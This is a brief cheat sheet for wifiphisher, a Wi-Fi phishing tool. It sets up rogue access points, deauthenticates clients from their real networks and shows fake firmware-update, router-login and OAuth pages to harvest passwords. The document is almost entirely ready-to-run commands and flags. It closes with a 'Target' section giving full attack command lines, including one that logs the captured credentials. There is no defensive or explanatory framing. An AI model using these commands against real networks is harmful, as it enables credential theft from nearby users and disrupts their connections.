# wifiphisher CHEATSHEET

## Quick Reference

### Basic Usage
```bash
sudo wifiphisher                          # Interactive
sudo wifiphisher -e "Free WiFi"           # Set ESSID
sudo wifiphisher -p firmware-upgrade      # Select template
```

### Options
```bash
-i interface          # Specify interface
-e ESSID              # Set rogue AP name
-p template           # Select phishing template
-nJ                   # Disable jamming
-nD                   # Skip deauth
-qS                   # Quit on success
--logging             # Enable logging
```

### Templates
```bash
-p firmware-upgrade   # Fake firmware update
-p network-manager    # Router login
-p oauth_login        # OAuth login
-p custom             # Custom HTML
```

### Advanced
```bash
-pK password          # WPA protect rogue AP
--deauth-channels 1,3,7  # Target channels
--lure10-capture      # Lure10 capture
--lure10-exploit db   # Lure10 exploit
--known-beacons       # Broadcast known SSIDs
--logging -lP /path   # Custom log path
```

---

## Target: 192.168.1.x

```bash
# Quick phishing attack
sudo wifiphisher -e "Free WiFi" -p firmware-upgrade -nJ

# With logging
sudo wifiphisher -p network-manager --logging -lP /var/log/phish.log
```
